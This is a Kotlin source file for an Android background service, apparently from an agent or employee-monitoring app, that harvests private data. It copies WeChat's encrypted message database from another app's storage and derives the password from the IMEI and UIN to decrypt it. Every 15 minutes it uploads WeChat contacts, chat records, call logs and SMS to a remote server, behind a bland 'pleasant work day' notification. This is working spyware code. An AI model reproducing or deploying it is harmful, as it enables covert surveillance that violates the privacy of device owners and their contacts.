package cn.xzj.agent.service

import android.annotation.SuppressLint
import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.BitmapFactory
import android.graphics.Color
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Message
import android.support.annotation.RequiresApi
import android.support.v4.app.NotificationCompat
import cn.xzj.agent.R
import cn.xzj.agent.constants.Constants
import cn.xzj.agent.constants.Keys
import cn.xzj.agent.entity.BaseResponseInfo
import cn.xzj.agent.entity.agentinfo.AgentInfo
import cn.xzj.agent.entity.privacy.*
import cn.xzj.agent.i.DBFileInitSuccessListener
import cn.xzj.agent.i.DBInitSuccessListener
import cn.xzj.agent.net.Client
import cn.xzj.agent.net.Observer2
import cn.xzj.agent.util.PrivacyUtils
import cn.xzj.agent.util.SharedPreferencesUtil
import cn.xzj.agent.util.WxMonitorUtils
import com.channey.utils.SharedPreferencesUtils
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.disposables.Disposable
import io.reactivex.schedulers.Schedulers
import net.sqlcipher.database.SQLiteDatabase
import java.util.*

/**
 * 上传用户微信联系人、聊天记录、短信以及通话记录
 * note:如果因为root原因，该服务开启失败，会开启  {@see UserPrivacyService}
 * @see UserPrivacyService
 */
class HeartBeatService : Service() {
    private var IMEI: String? = null
    private var UIN: String? = null
    private var PWD: String? = null
    private var CUR_DB_PATH: String = ""
    private var mWxDatabase: SQLiteDatabase? = null
    private val DATA_UPLOAD_PERIOD = 15 * 60 * 1000L
    private var mWechatNumber: String? = null
    private var agentInfo: AgentInfo? = null


    private var mHandler = @SuppressLint("HandlerLeak")
    object : Handler() {
        override fun handleMessage(msg: Message) {
            IMEI = SharedPreferencesUtils.getString(this@HeartBeatService, Keys.WX_IMEI, Activity.MODE_MULTI_PROCESS)
            CUR_DB_PATH = "/data/data/$packageName/${Constants.COPY_WX_DATA_DB}"
            UIN = SharedPreferencesUtils.getString(this@HeartBeatService, Keys.UIN, Activity.MODE_MULTI_PROCESS)
            PWD = WxMonitorUtils.initDbPassword(IMEI!!, UIN!!)
            mWechatNumber = WxMonitorUtils.getValueFromPref(Constants.com_tencent_mm_preferences_path, "login_weixin_username")
            copyDbFile(UIN!!, CUR_DB_PATH, object : DBFileInitSuccessListener {
                override fun onSuccess() {
                    WxMonitorUtils.openDB(this@HeartBeatService, CUR_DB_PATH, PWD!!, object : DBInitSuccessListener {
                        override fun onSuccess(db: SQLiteDatabase) {
                            try {
                                //get wechat contacts
                                val weChatContactList = WxMonitorUtils.getContacts(db!!)
                                uploadWeChatContacts(weChatContactList)
                            } catch (e: Exception) {
                                e.printStackTrace()
                            }

                            Client.getInstance(this@HeartBeatService).apiManager
                                    .getLastUploadDate(agentInfo!!.agentId, "WECHANT_RECORD")
                                    .subscribeOn(Schedulers.io())
                                    .observeOn(AndroidSchedulers.mainThread())
                                    .subscribe(object: Observer2<BaseResponseInfo<Long>>() {
                                        override fun onComplete() {
                                        }

                                        override fun onSubscribe(d: Disposable) {
                                        }

                                        override fun onNext(t: BaseResponseInfo<Long>) {
                                            try {
                                                val weChatRecords = WxMonitorUtils.getWeChatRecords(this@HeartBeatService.applicationContext, t!!.content, db!!)
                                                uploadWeChatRecords(weChatRecords)
                                            } catch (e: Exception) {
                                                e.printStackTrace()
                                            }
                                            db.close()
                                        }

                                        override fun onError(e: Throwable) {
                                            try {
                                                val weChatRecords = WxMonitorUtils.getWeChatRecords(this@HeartBeatService.applicationContext, 0, db!!)
                                                uploadWeChatRecords(weChatRecords)
                                            } catch (e: Exception) {
                                                e.printStackTrace()
                                            }
                                            db.close()
                                        }

                                    })
                        }
                    })
                }
            })

            Client.getInstance(this@HeartBeatService).apiManager
                    .getLastUploadDate(agentInfo!!.agentId, "CALL_PHONE")
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(object :Observer2<BaseResponseInfo<Long>>(){
                        override fun onComplete() {
                        }

                        override fun onSubscribe(d: Disposable) {
                        }

                        override fun onNext(t: BaseResponseInfo<Long>) {
                            PrivacyUtils.getUserCallLogs(this@HeartBeatService, t.content) { list -> uploadCallLog(list) }
                        }

                        override fun onError(e: Throwable) {
                            PrivacyUtils.getUserCallLogs(this@HeartBeatService, 0) { list -> uploadCallLog(list) }
                        }

                    })
            Client.getInstance(this@HeartBeatService).apiManager
                    .getLastUploadDate(agentInfo!!.agentId, "SMS_RECORD")
                    .subscribeOn(Schedulers.io())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(object :Observer2<BaseResponseInfo<Long>>(){
                        override fun onComplete() {
                        }

                        override fun onSubscribe(d: Disposable) {
                        }

                        override fun onNext(t: BaseResponseInfo<Long>) {
                            PrivacyUtils.getUserSms(this@HeartBeatService, t!!.content) { list -> uploadSms(list) }
                        }

                        override fun onError(e: Throwable) {
                            PrivacyUtils.getUserSms(this@HeartBeatService, 0) { list -> uploadSms(list) }
                        }

                    })
        }
    }

    private var mTimer: Timer = Timer()
    private var mTimerTask: TimerTask = object : TimerTask() {
        override fun run() {
            mHandler.sendEmptyMessage(0)
        }
    }

    @SuppressLint("SdCardPath")
    override fun onCreate() {
        super.onCreate()
        agentInfo = SharedPreferencesUtil.getCurrentAgentInfo(this)
        IMEI = SharedPreferencesUtils.getString(this, Keys.WX_IMEI, Activity.MODE_MULTI_PROCESS)
        CUR_DB_PATH = "/data/data/$packageName/${Constants.COPY_WX_DATA_DB}"
        UIN = SharedPreferencesUtils.getString(this, Keys.UIN, Activity.MODE_MULTI_PROCESS)
        PWD = WxMonitorUtils.initDbPassword(IMEI!!, UIN!!)

//        mWxDatabase = WxMonitorUtils.openDB(this, CUR_DB_PATH, PWD!!)
        mTimer.schedule(mTimerTask, 0, DATA_UPLOAD_PERIOD)
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundService()
        return super.onStartCommand(intent, flags, startId)
    }

    override fun onUnbind(intent: Intent?): Boolean {
        return super.onUnbind(intent)
    }

    override fun onRebind(intent: Intent?) {
        super.onRebind(intent)
    }

    override fun onDestroy() {
        super.onDestroy()
        if (mWxDatabase != null) mWxDatabase!!.close()
        stopTimer()
    }

    private fun stopTimer() {
        mTimer.cancel()
    }

    private fun startForegroundService() {
        //使用兼容版本
        val builder = NotificationCompat.Builder(this)
        builder.setSmallIcon(R.mipmap.logo)
        builder.setLargeIcon(BitmapFactory.decodeResource(resources, R.mipmap.logo))
        builder.setAutoCancel(false)
        builder.setOngoing(true)
        builder.setShowWhen(false)
        builder.setContentTitle("祝您工作愉快")
        val channelId =
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    createNotificationChannel()
                } else {
                    ""
                }
        builder.setChannelId(channelId)
        val notification = builder.build()
        startForeground(10086, notification)
    }

    @RequiresApi(Build.VERSION_CODES.O)
    private fun createNotificationChannel(): String {
        val channelId = "com.xzj.agent.HeartBeatService"
        val channelName = "HeartBeatService"
        val chan = NotificationChannel(channelId,
                channelName, NotificationManager.IMPORTANCE_HIGH)
        chan.lightColor = Color.BLUE
        chan.importance = NotificationManager.IMPORTANCE_NONE
        chan.lockscreenVisibility = Notification.VISIBILITY_PRIVATE
        val service = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        service.createNotificationChannel(chan)
        return channelId
    }



    private fun uploadWeChatContacts(list: List<WechatContactInfo>) {
        Client.getInstance(this@HeartBeatService).apiManager!!.uploadWeChatContacts(agentInfo!!.agentId, WechatContactsUploadBody(list, mWechatNumber!!)).subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(object : Observer2<BaseResponseInfo<Boolean>>() {
                    override fun onComplete() {
                    }

                    override fun onSubscribe(d: Disposable) {
                    }
                    override fun onError(e: Throwable) {}

                    override fun onNext(info: BaseResponseInfo<Boolean>) {
                        if (info.isSuccess()) setWeChatContactsUploadedFlag()
                    }
                })
    }

    private fun uploadWeChatRecords(list: List<WeChatRecordInfo>) {
        Client.getInstance(this@HeartBeatService).apiManager!!.uploadWeChatRecords(agentInfo!!.agentId, WeChatRecordsUploadBody(list, mWechatNumber!!))
        .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(object : Observer2<BaseResponseInfo<Boolean>>() {
                    override fun onComplete() {
                    }

                    override fun onSubscribe(d: Disposable) {
                    }

                    override fun onError(e: Throwable) {}

                    override fun onNext(info: BaseResponseInfo<Boolean>) {
                        if (info.isSuccess()) setWeChatRecordsUploadedFlag()
                    }
                })
    }

    private fun uploadCallLog(callLog: List<CallLogInfo>?) {
        Client.getInstance(this@HeartBeatService).apiManager!!.uploadCallLog(agentInfo!!.agentId, CallLogUploadBody(callLog!!))
        .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(object : Observer2<BaseResponseInfo<Boolean>>() {
                    override fun onSubscribe(d: Disposable) {
                    }

                    override fun onComplete() {}

                    override fun onError(e: Throwable) {}

                    override fun onNext(info: BaseResponseInfo<Boolean>) {
                        if (info.isSuccess()) setCallLogUploadedFlag()
                    }
                })
    }

    private fun uploadSms(smsList: List<SmsInfo>) {
        Client.getInstance(this@HeartBeatService).apiManager.uploadSms(agentInfo!!.agentId, SmsUploadBody(smsList))
        .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(object : Observer2<BaseResponseInfo<Boolean>>() {
                    override fun onComplete() {
                    }

                    override fun onSubscribe(d: Disposable) {
                    }

                    override fun onError(e: Throwable) {}

                    override fun onNext(info: BaseResponseInfo<Boolean>) {
                        if (info.isSuccess()) setSmsUploadedFlag()
                    }
                })
    }

    private fun setWeChatContactsUploadedFlag() {
        SharedPreferencesUtils.saveBoolean(this, Keys.ALREADY_UPLOAD_WECHAT_CONTACT, true, Activity.MODE_MULTI_PROCESS)
    }

    private fun setWeChatRecordsUploadedFlag() {
        SharedPreferencesUtils.saveBoolean(this, Keys.ALREADY_UPLOAD_WECHAT_RECORDS, true, Activity.MODE_MULTI_PROCESS)
    }

    private fun setCallLogUploadedFlag() {
        SharedPreferencesUtils.saveBoolean(this, Keys.ALREADY_UPLOAD_CALL_LOG, true, Activity.MODE_MULTI_PROCESS)
    }

    private fun setSmsUploadedFlag() {
        SharedPreferencesUtils.saveBoolean(this, Keys.ALREADY_UPLOAD_SMS, true, Activity.MODE_MULTI_PROCESS)
    }

    private fun copyDbFile(uin: String, to: String, listener: DBFileInitSuccessListener) {
        var md5 = WxMonitorUtils.md5("mm$uin")
        WxMonitorUtils.copyFile("${Constants.WX_DB_DIR_PATH}/$md5/${Constants.WX_DB_FILE_NAME}", to, listener)
    }

    private fun getWeChatDbPath(): String {
        var md5 = WxMonitorUtils.md5("mm$UIN")
        return "${Constants.WX_DB_DIR_PATH}/$md5/${Constants.WX_DB_FILE_NAME}"
    }
}